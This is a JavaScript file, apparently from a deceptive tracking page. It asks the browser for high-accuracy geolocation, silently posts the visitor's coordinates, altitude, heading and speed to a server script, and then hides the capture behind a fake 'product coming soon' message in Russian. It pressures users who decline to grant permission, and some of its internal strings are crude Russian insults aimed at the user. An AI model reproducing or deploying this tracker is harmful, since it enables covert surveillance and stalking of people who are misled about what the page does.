function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Не поддерживается в вашем браузере...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    $.ajax({
      type: 'POST',
      url: '/php/result.php',
      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
      success: function(){$('#change').html('Coming Soon');},
      mimeType: 'text'
    });
    alert('Спосибо что пользуетесь нашим сервисом...Этот продукт скоро выйдет...');
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'Поьзователь отказался показать свой письюн!';
      alert('Обновите страницу и дайте разрешение на местоположение для лучших результатов...');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'сведение о местоположении недоступно';
			break;
		case error.TIMEOUT:
			var timeout = 'Первишен интервал запросов';
      alert('Выберите точность местоположение...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'Бля ты что натворил а? Ошибка нахуй!';
			break;
	}

  $.ajax({
    type: 'POST',
    url: '/php/error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Failed');},
    mimeType: 'text'
  });
}
